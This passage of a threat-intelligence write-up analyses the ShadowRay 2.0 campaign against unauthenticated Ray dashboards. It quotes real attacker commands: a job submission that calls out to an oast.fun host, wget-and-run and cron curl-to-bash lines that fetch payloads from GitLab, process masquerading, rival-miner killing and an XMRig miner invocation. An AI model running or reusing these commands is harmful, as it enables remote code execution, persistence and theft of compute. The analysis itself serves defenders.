w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790ca1ea19100e1541679c_691bd9e2e579c4823eedccc0_b5c93b1d.avif" loading="lazy"/></div></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790ca0ea19100e1541677a_691bd9e2e579c4823eedcccf_3a32149e.avif" loading="lazy"/></div><figcaption><em>WorldWide spread of ray dashboards, after ShadowRay was discovered by Oligo there are more than 200K instances (10x increase). Source: Shodan</em></figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790ca1ea19100e154167a8_691bd9e2e579c4823eedccc9_7a44b9ce.avif" loading="lazy"/></div><figcaption>‍<em>A time series view of vulnerable instances starting in April 2024. Source: Shodan </em></figcaption></figure><h2><strong>New Threat Actors, New Attacks</strong></h2><p>The campaign we have observed mirrors some of the characteristics and behaviors consistent with ShadowRay’s original exploitation chain:</p><ul role="list"><li>RCE via the exposed Ray dashboard API.</li><li>Payload injection to deploy cryptocurrency miners and data exfiltration tools.</li><li>Persistence mechanisms disguised as Ray worker processes.</li><li>New IoCs observed in compromised nodes (full list below).  </li></ul><p>While this new activity shares some common threads with our March 2024 research, it is being carried out by <strong>entirely new threat actors that are leveraging different techniques</strong> to reach their end goals.</p><h2><strong>Two Waves of Attacks Uncovered</strong></h2><p>Our analysis of the ShadowRay 2.0 activity shows that the campaign did not end with a single takedown. Instead, it evolved across two platforms:</p><ul role="list"><li><strong>Wave One – GitLab launched: </strong>In early November 2025, attackers were using GitLab for their payload evolution and delivery. After Oligo reported the activity to GitLab, the attackers’ account and repository was removed on November 5, 2025.</li><li><strong>Wave Two – GitHub launched: </strong>Within days of the GitLab takedown, the threat actors reestablished their operation by standing up a new GitHub repository to continue the advanced attacks via a repository that went live on November 10, 2025. On November 17, the repo was taken down, with attackers immediately creating a new one on the same day. The second wave remains active, demonstrating the attackers’ persistence and agility in maintaining the campaign. </li></ul><p>Below, we walk through the technical details, findings, and evidence of the techniques the attackers have deployed in both phases of this ongoing campaign. </p><h2><strong>GitLab-Launched Attack Campaign: Technical Breakdown and Evidence of Techniques</strong></h2><p>Below, we walk through the specific techniques the attackers used in this campaign with GitLab as their delivery mechanism, providing evidence of what was uncovered and how they used their methods to evolve from simple cryptojacking efforts to building a multi-purpose botnet.</p><h3><strong>1: Discovery - &quot;Finding the Needle in the Internet Haystack&quot;</strong></h3><p>Attackers used interact.sh (an OAST platform) to spray payloads across the internet and identify which Ray dashboard IPs were exploitable. By sending callbacks to oast.fun subdomain, they could track which servers executed their commands.</p><p>Attackers have triggered the very first step in Ray by posting a job that :<br/><br/><code>curl -X POST &quot;</code><a href="https://about:blank"><code>http://[host]:[port]/api/jobs/</code></a><code>&quot; -H &#x27;Content-Type: application/json&#x27; -d &#x27;{&quot;entrypoint&quot;: &quot;curl bwqqvqfgsseplyoltois92rdukv0mm5th.oast.fun&quot;}&#x27;</code></p><p>This is reconnaissance as a service - attackers weaponized out-of-band platforms to automatically discover vulnerable targets at scale. Instead of manual scanning, they let victims identify themselves by calling back. This approach also helps evade traditional scanning detection.</p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b81229eb99a3dcabf77_691bd9e2e579c4823eedccba_9c108a09.png" loading="lazy"/></div><figcaption>Attackers used oast.fun subdomain domains for free.<br/>Source: <a href="https://github.com/projectdiscovery/interactsh">https://github.com/projectdiscovery/interactsh</a></figcaption></figure><p>‍</p><h3><strong>2: Initial Access - &quot;Exploiting Ray&#x27;s Trust&quot;</strong></h3><p>Attackers exploited completely unauthenticated Ray Job Submission APIs (/api/jobs/) on exposed dashboards. They submitted malicious jobs with commands ranging from simple reconnaissance (uname -a, id) to complex multi-stage Bash and Python payloads.</p><p>Ray&#x27;s dashboard was designed for trusted internal networks but is frequently exposed to the internet without authentication. The attackers didn&#x27;t need to exploit a vulnerability, they just used Ray&#x27;s features as designed. This is a configuration vulnerability at scale.</p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b81229eb99a3dcabf57_691bd9e2e579c4823eedccb4_f77759fa.png" loading="lazy"/></div><figcaption>Some payloads checked for EC2 Instances or machines with 4 CPUs (and at some point, the attackers increased it to a minimum of 8 CPUs).</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b81229eb99a3dcabf54_691bd9e2e579c4823eedccbd_74c50ea5.png" loading="lazy"/></div><figcaption>Searching for AWS credentials</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b81229eb99a3dcabf71_691bd9e2e579c4823eedccc6_8794a6cc.png" loading="lazy"/></div></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b81229eb99a3dcabf6e_691bd9e2e579c4823eedccc3_d0755a58.png" loading="lazy"/></div><figcaption>By seeing the permission errors attackers ran into in the compromised Ray dashboard job history and logs - attackers knew why payloads were failing. With detailed error messages printed to the job’s STDERR/STDOUT, they adapted their payloads and succeeded the next time.</figcaption></figure><p>The obfuscated “stage 2” of the payload includes the docstrings and useless echoes, which strongly implies the code is LLM-generated:</p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b82229eb99a3dcabf8f_691bd9e2e579c4823eedcccc_254b4379.png" loading="lazy"/></div><figcaption>Notice the comment: &quot;Suppress the warnings inside payload as well” - as if the attackers asked for it specifically.</figcaption></figure><p>The payloads were base64-encoded. After decoding, we can see the LLM-generated payloads still include their documentation - like we saw with the rest of the payloads. Stage 2 is around resource discovery, and uses only 1 CPU. </p><h3><strong>3: Lateral Movement - &quot;Weaponizing Ray&#x27;s Orchestration&quot;</strong></h3><p>Attackers deployed a payload that used Ray&#x27;s <a href="https://docs.ray.io/en/latest/ray-core/api/doc/ray.util.scheduling_strategies.NodeAffinitySchedulingStrategy.html">NodeAffinitySchedulingStrategy</a> to execute malware on every alive node in the cluster. The payload literally enumerated all nodes and submitted jobs pinned to each specific node ID.</p><p>This is lateral movement via legitimate orchestration features in Ray. Instead of exploiting CVEs or using network attacks, attackers used Ray&#x27;s own scheduling API to spread. It&#x27;s essentially using the victim&#x27;s infrastructure as intended, using python code - like the applications that are already running,  just for malicious purposes:</p><p><code>nodes=[n for n in ray.nodes() if n.get(&#x27;Alive&#x27;,False)]</code></p><p><code>cmd=&#x27;wget -qO- https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/aa.sh | tr -d &quot;\\r&quot; &gt; aa_clean.sh &amp;&amp; chmod +x aa_clean.sh &amp;&amp; ./aa_clean.sh&#x27;</code></p><p><code>[ray.get(ray.remote(lambda: subprocess.run(cmd,shell=True)).options(scheduling_strategy=NodeAffinitySchedulingStrategy(node_id=n.get(&#x27;NodeID&#x27;)...</code></p><p>‍</p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b82229eb99a3dcabf92_691bd9e2e579c4823eedccd3_21d4982c.png" loading="lazy"/></div><figcaption>Attackers ran the payloads several times. We could see long-running active payloads in realtime. The reverse shell was open for 22 hours.</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b81229eb99a3dcabf74_691bd9e2e579c4823eedccdf_17fad92c.png" loading="lazy"/></div><figcaption>A compromised cluster with 1000GB Memory (1TB). This was only the beginning.</figcaption></figure><h3><strong>4: AI-Generated Reconnaissance - &quot;Using AI to Attack AI&quot;</strong></h3><p>Attackers deployed a sophisticated multi-stage Python payload that discovers cluster resources (CPUs, GPUs), calculates optimal allocation (60%), and then submits a takeover job with those exact resource requirements.</p><p>The payloads from gitlab are likely to be AI-generated, based on its structure, comments, and error handling patterns. Attackers are now using AI to generate attack code targeting AI infrastructure. The 60% resource allocation is particularly clever, as it leaves enough resources running to avoid immediate detection while maximizing mining profits.</p><p><strong>Key Payload Features</strong>:</p><ul role="list"><li>Automatic CPU/GPU discovery via ray.cluster_resources()</li><li>Dynamic resource calculation: usable_cpus = max(1, int(total_cpus * 0.6))</li><li>Multi-stage execution with error handling</li></ul><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b81229eb99a3dcabf6b_691bd9e2e579c4823eedccd6_b3843da6.png" loading="lazy"/></div><figcaption>A machine with 8 or more CPUs and root access is considered a “VERY GOOD BOY”.<br/>A joke by the attackers?</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b82229eb99a3dcabf9a_691bd9e2e579c4823eedccd9_a32d4605.png" loading="lazy"/></div></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b82229eb99a3dcabf88_691bd9e2e579c4823eedccdc_47100785.png" loading="lazy"/></div></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b81229eb99a3dcabf57_691bd9e2e579c4823eedccb4_f77759fa.png" loading="lazy"/></div></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b81229eb99a3dcabf5e_691bd9e2e579c4823eedcce2_6e83555a.png" loading="lazy"/></div></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b81229eb99a3dcabf65_691bd9e2e579c4823eedcce8_ea757920.png" loading="lazy"/></div></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b81229eb99a3dcabf7d_691bd9e2e579c4823eedcce5_26ffaf03.png" loading="lazy"/></div></figure><h3><strong>5: Reverse Shells - &quot;Opening the Backdoor&quot;</strong></h3><p>Attackers established multiple interactive reverse shells to AWS-hosted C2 servers, giving them command-line access to compromised Ray clusters. Multiple shells to different ports suggest redundancy or different attack operators.</p><p>The use of multiple simultaneous reverse shells on different ports indicates either multiple attackers competing for access or sophisticated failover mechanisms. Evidence shows shells connecting to ports 3876, 40331, 48331, and 443 - suggesting extensive C2 infrastructure.</p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b81229eb99a3dcabf7a_691bd9e2e579c4823eedcd1a_a84f658a.png" loading="lazy"/></div><figcaption>Attacker IP in reverse shell python payload</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b82229eb99a3dcabf9d_691bd9e2e579c4823eedcd0e_6a340f82.png" loading="lazy"/></div></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b82229eb99a3dcabf8b_691bd9e2e579c4823eedcd0b_2019fffd.png" loading="lazy"/></div><figcaption>Active reverse shells to the attacker&#x27;s IPs</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b81229eb99a3dcabf68_691bd9e2e579c4823eedcd1f_8aab2d65.png" loading="lazy"/></div><figcaption>One can see the opened Python reverse shells in the Ray dashboard job history</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b81229eb99a3dcabf80_691bd9e2e579c4823eedcceb_a7f23d30.png" loading="lazy"/></div></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b82229eb99a3dcabf88_691bd9e2e579c4823eedccdc_47100785.png" loading="lazy"/></div></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b84229eb99a3dcac02a_691bd9e2e579c4823eedcd11_3c08b05b.png" loading="lazy"/></div></figure><h3><strong>6: Persistence - &quot;Ensuring They Never Leave&quot;</strong></h3><p>Attackers installed multiple persistence mechanisms: cron jobs running every 15 minutes, systemd services disguised as system components, and .bashrc injections. The cron job continuously re-downloads and executes mon.sh from GitLab.</p><p>The use of GitLab as a live C2 infrastructure means attackers can update payloads in real-time. Every 15 minutes, all compromised systems check for updates and re-infect themselves. This turns GitLab into a distributed update mechanism for malware.</p><p><strong>Cron Job</strong>:</p><p><code>*/15 * * * * wget -O - https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/mon.sh | bash</code></p><p>‍</p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b84229eb99a3dcac02d_691bd9e2e579c4823eedcd14_6a8730fe.png" loading="lazy"/></div></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b86229eb99a3dcac05e_691bd9e2e579c4823eedcd17_21670c97.png" loading="lazy"/></div></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b86229eb99a3dcac062_691bd9e2e579c4823eedcd22_6dd578f3.png" loading="lazy"/></div></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b84229eb99a3dcac030_691bd9e2e579c4823eedcd25_89cf60df.png" loading="lazy"/></div></figure><h3><strong>7: Masquerading - &quot;Hiding in Plain Sight&quot;</strong></h3><p>Attackers renamed malicious processes to look like legitimate Linux kernel workers (kworker/0:0) and system services (dns-filter). The XMRig cryptocurrency miner was renamed to .python3.6 and disguised as a systemd service.</p><p>The sophistication of process renaming goes beyond simple hiding. By using echo <code>&quot;kworker/0:0&quot; &gt; /proc/$$/comm</code>, they change how the process appears in system monitoring tools. The name &quot;dns-filter&quot; suggests DNS filtering, which IT teams might expect to see running.</p><p><strong>Masquerading Techniques</strong>:</p><ul role="list"><li>Process rename to [kworker/0:0] (appears as kernel worker)</li><li>Binary named /usr/lib/dev/systemdev/dns-filter (looks like system service)</li><li>Hidden binary .python3.6 in current directory</li><li>Systemd service names: custom-X-service</li></ul><p>‍</p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b86229eb99a3dcac06b_691bd9e2e579c4823eedcd28_fda5ec0d.png" loading="lazy"/></div><figcaption>The persistence method - using crontab and system service, disguised as ‘health-monitor’, ‘dns’ or as ‘dns-filter’.</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b86229eb99a3dcac07c_691bd9e2e579c4823eedcd2b_c35acb20.png" loading="lazy"/></div><figcaption>/tmp/dns is a cryptominer</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b85229eb99a3dcac04b_691bd9e2e579c4823eedcd2e_f322beae.png" loading="lazy"/></div><figcaption>./aa_clean.sh is a middle recon stage by the attackers.</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b85229eb99a3dcac048_691bd9e2e579c4823eedcd31_893c4c21.png" loading="lazy"/></div><figcaption>Downloading cryptominer to /usr/lib/dev/systemdev/dns-filter</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b86229eb99a3dcac071_691bd9e2e579c4823eedcd37_89fa72d1.png" loading="lazy"/></div><figcaption>Downloading the “aa.sh” script from GitLab in the payload.</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b86229eb99a3dcac065_691bd9e2e579c4823eedcd34_68cc8656.png" loading="lazy"/></div><figcaption>Newer shells used “netsh” while older reverse shells started via /var/tmp/.ddns.sh</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b85229eb99a3dcac04f_691bd9e2e579c4823eedcd40_c90e030d.png" loading="lazy"/></div><figcaption>Disguising as Python 3.6 process </figcaption></figure><h3><strong>8: GPU Mining - &quot;Stealing Premium Compute&quot;</strong></h3><p>Attackers specifically targeted Ray clusters with NVIDIA GPUs (A100s in particular). Environment variables show NVIDIA libraries loaded and 23.9GB of GPU memory consumed, but Ray&#x27;s dashboard reports 0% GPU utilization, indicating a hidden miner.</p><p>GPU cryptojacking is a goldmine, because A100 GPUs cost $3-4/hour on cloud platforms. By hiding GPU usage from Ray&#x27;s monitoring, attackers avoid immediate detection while stealing premium compute resources. The resource discovery payload specifically checks for GPU availability before deploying GPU-enabled miners.</p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b86229eb99a3dcac06e_691bd9e2e579c4823eedcd3a_e49bf555.png" loading="lazy"/></div><figcaption>Cluster of NVIDIA A100 GPUs</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b85229eb99a3dcac052_691bd9e2e579c4823eedcd3d_8f2d6fec.png" loading="lazy"/></div></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b84229eb99a3dcac033_691bd9e3e579c4823eedcd67_ea3d9d61.png" loading="lazy"/></div><figcaption>Making the machine look under-utilized: The Ray GPU utilization looks low (0%) as the subprocess that runs XMRig takes over the GPU resources in practice.</figcaption></figure><h3><strong>9: Competition Elimination - &quot;Cryptojacker vs. Cryptojacker&quot;</strong></h3><p>Attackers deployed sophisticated scripts to detect and kill rival cryptocurrency miners. They hunt for processes matching patterns like &quot;xmrig&quot;, &quot;minerd&quot;, &quot;ccminer&quot;, or any process using &gt;25% CPU. They also block competing mining pools via /etc/hosts and firewall rules.</p><p>This reveals a hidden war between cryptojacking groups. Multiple attackers are targeting the same Ray clusters, and they&#x27;re actively fighting each other for resources. The scripts specifically protect their own miner (connected to supportxmr.com) while killing everything else. It&#x27;s organized crime with source code.</p><p><strong>Protection Logic</strong>:</p><p><code>if echo &quot;$cmdline&quot; | grep -vq &quot;supportxmr.com&quot; &amp;&amp; echo &quot;$cmdline&quot; | grep -q &quot;xmrig&quot;; then</code></p><p><code>    kill -9 &quot;$pid&quot;  </code><em><code># Kill rival miner</code></em></p><p><code>fi</code></p><p><strong>Blocked Mining Pools</strong>:</p><ul role="list"><li>pool.minexmr.com</li><li>xmrpool.eu</li><li>Multiple other Monero pools via /etc/hosts and iptables<br/></li></ul><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b84229eb99a3dcac039_691bd9e3e579c4823eedcd5a_94fe3691.png" loading="lazy"/></div><figcaption>Logs from a compromised dashboard, the payload is blocking competitor mining pool, and hosts, using hosts file and iptables.</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b86229eb99a3dcac07f_691bd9e3e579c4823eedcd63_26c3ce42.png" loading="lazy"/></div></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b84229eb99a3dcac036_691bd9e3e579c4823eedcd60_7553b0d6.png" loading="lazy"/></div><figcaption>Attackers explicitly killing running miners</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b85229eb99a3dcac045_691bd9e3e579c4823eedcd5d_2f1186ae.png" loading="lazy"/></div></figure><p>Kicking out competitors - Manipulation of iptables to block other attackers and threat actors from reaching the vulnerable instance again after killing their processes.</p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b82229eb99a3dcabf9a_691bd9e2e579c4823eedccd9_a32d4605.png" loading="lazy"/></div><figcaption>Killing specific &quot;unwanted&#x27; processes by name (index.js and xmr by name)</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b8a229eb99a3dcac1ca_691bd9e3e579c4823eedcd70_e5faa15b.png" loading="lazy"/></div><figcaption>Killing CPUs with high utilization, except their own miner (by pattern found in cmdline)</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b89229eb99a3dcac189_691bd9e3e579c4823eedcd6d_378aa1d7.png" loading="lazy"/></div><figcaption>Logic to determine which miners not to kill or not.</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b88229eb99a3dcac15d_691bd9e3e579c4823eedcd6a_5a3669b3.png" loading="lazy"/></div><figcaption>Blocking other common mining pools - to fail other attackers that might reach the compromised server later.</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b88229eb99a3dcac161_691bd9e3e579c4823eedcd73_6533e8d5.png" loading="lazy"/></div></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b89229eb99a3dcac1a4_691bd9e3e579c4823eedcd76_1eabed3f.png" loading="lazy"/></div><figcaption>Payload config</figcaption></figure><p>The same file as above, on GitLab - at a later point in time. Their “NEW POOL &amp; WALLET” according to the docstrings - the attackers have been doing it with different addresses for along time.</p><h3><strong>10: Geographic Targeting - &quot;Adapting to the Victim&quot;</strong></h3><p>Attackers implemented geolocation detection to identify if the victim is in China. Chinese victims receive payloads from run-CN.sh (using China-accessible CDNs), while others get run.sh. This suggests infrastructure optimization and censorship bypass.</p><p>This is region-aware malware. By detecting the victim&#x27;s country, attackers can adapt delivery methods, potentially use regional proxies (GitHub proxy and Chinese IP geolocation services), and optimize for network conditions. It suggests a mature operation targeting global infrastructure world-wide.</p><p><strong>Geolocation Detection</strong>:</p><p><code>if curl -s --connect-timeout 3 -4 http://ip-api.com/json/ | grep -q &#x27;&quot;country&quot;:&quot;China&quot;&#x27;; then</code></p><p><code>    is_in_china=true</code></p><p><code>    download_url=&quot;https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/run-CN.sh&quot;</code></p><p><code>fi</code></p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b89229eb99a3dcac1a7_691bd9e3e579c4823eedcd79_2c0d8ada.png" loading="lazy"/></div><figcaption>Payload checks for China geolocation via ip-api.com - which is available in china. </figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b89229eb99a3dcac179_691bd9e3e579c4823eedcd7c_9f07dd6f.png" loading="lazy"/></div></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b89229eb99a3dcac199_691bd9e3e579c4823eedcd7f_3e7b726c.png" loading="lazy"/></div></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b88229eb99a3dcac164_691bd9e3e579c4823eedcd82_75ea90d8.png" loading="lazy"/></div></figure><p><br/>Proxied download via <a href="http://gh-proxy.com">gh-proxy.com</a> - so the payload will succeed in Chinese servers that have censored DNS support - or to bypass security rules that prevent requests to <a href="http://github.com">github.com</a> directly.<br/><br/></p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b89229eb99a3dcac17c_691bd9e3e579c4823eedcd85_cafd7f5a.png" loading="lazy"/></div></figure><p>Some payloads tried using either wget or curl - usually one of them was present on the machine and fetched the initial payload from GitLab, and later, the miner through GitHub.</p><h3><strong>11: Cryptocurrency Mining - &quot;The Payoff&quot;</strong></h3><p>Attackers deployed XMRig miners connecting to pool.supportxmr.com:443 using TLS encryption. Multiple compromised clusters show 99% CPU usage and significant GPU utilization.</p><p>The use of TLS on port 443 makes mining traffic look like legitimate HTTPS traffic, blending into normal network activity. The mining pool tracks show regular payouts, confirming this is an active, profitable operation.</p><p><strong>Example Mining Configuration (there were many)</strong>:</p><p><code>/usr/lib/dev/systemdev/dns-filter -o pool.supportxmr.com:443 -u 45MinZ6ECgTgxn8gbm5gAsK9ATrEN6N95hbH3g4r5N4bKwH8QxuFygw3G7VwHwAusR9L35E4YjWYdTJaWDjbMGDCKYNz5X1.v2 --tls</code></p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b89229eb99a3dcac18c_691bd9e3e579c4823eedcd8b_7168cb5f.png" loading="lazy"/></div></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b89229eb99a3dcac172_691bd9e3e579c4823eedcd8e_a6ad8d6f.png" loading="lazy"/></div></figure><p>The files when accessed on Nov. 2</p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b89229eb99a3dcac175_691bd9e3e579c4823eedcda6_14f4b43c.png" loading="lazy"/></div></figure><p>The files when accessed on Nov. 4 Attacker payload changes were visible through GitLab diffs:</p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b89229eb99a3dcac1b1_691bd9e3e579c4823eedcda9_081c2815.png" loading="lazy"/></div></figure><p>The attackers changed their “exclude pattern” - their own miner fingerprint - that is used to distinguish other miners that were a result of another attack group.<br/></p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b89229eb99a3dcac17f_691bd9e3e579c4823eedcdaf_c3137b29.png" loading="lazy"/></div></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b89229eb99a3dcac192_691bd9e3e579c4823eedcdac_6e73dc89.png" loading="lazy"/></div></figure><p>The difference was visible through GitLab easily - Here is a commit that removes all comments (probably using an LLM too).</p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b89229eb99a3dcac1aa_691bd9e3e579c4823eedcdb5_d3442245.png" loading="lazy"/></div></figure><p>Some payloads were hosted on GitHub. This repo is used for hosting malware as GitHub version releases.</p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b89229eb99a3dcac18f_691bd9e3e579c4823eedcdbb_6077a02a.png" loading="lazy"/></div><figcaption>Note the commented out &quot;old&quot; repo in gitlab</figcaption></figure><p>Attackers have downloaded cryptominer binaries from different repositories, hosts and IPs over time. We found this gitlab username in one of the payload’s comments, probably leftovers of an older payload from an older repository. </p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b89229eb99a3dcac16f_691bd9e3e579c4823eedcdb2_30af7666.png" loading="lazy"/></div><figcaption>We looked at the username, and found it was blocked, probably due to the same malicious activity by the group.</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b8e229eb99a3dcac291_691bd9e3e579c4823eedcdb8_96d067f9.png" loading="lazy"/></div><figcaption>CryptoMiners binaries were often served through GitHub release files.</figcaption></figure><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b8d229eb99a3dcac280_691bd9e3e579c4823eedcdc1_02c1a4ed.png" loading="lazy"/></div><figcaption>The inspected GitHub repositories had no code at all, only releases that include cryptominers in the artifacts. This kind of repository behavior is 